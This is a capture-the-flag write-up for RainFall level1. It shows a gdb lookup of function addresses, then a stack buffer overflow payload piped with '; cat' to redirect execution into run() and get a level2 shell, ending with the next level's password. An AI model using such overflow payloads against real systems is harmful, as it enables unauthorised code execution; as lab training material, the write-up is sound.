LEVEL_1:
# 📚 Exploiting `level1` – call the shell inside the run function.
    
get the addr of the run system:
```
level1@RainFall:~$ gdb ./level1
info functions 
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
```
 so the addr of the run func : 0x08048444  run       
```sh
level1@RainFall:~$ (python -c 'print("A"*76 + "\x44\x84\x04\x08")') | ./level1
Good... Wait what?
Segmentation fault (core dumped)

```
The payload is sent into ./level1’s stdin.

But once Python finishes printing, EOF (end-of-file) is reached on stdin.

So when your exploit works and /bin/sh is spawned, the shell immediately sees EOF on its input and exits right away — you don’t get to interact with it.

the fix is `; cat`
```sh
level1@RainFall:~$ (python -c 'print("A"*76 + "\x44\x84\x04\x08")' ; cat) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
First, Python prints your payload (overflow + return address).

Then, cat continues running and forwards your keyboard input into the process.

Now, when /bin/sh spawns, it still has a live stdin to read from — so you get an interactive shell.
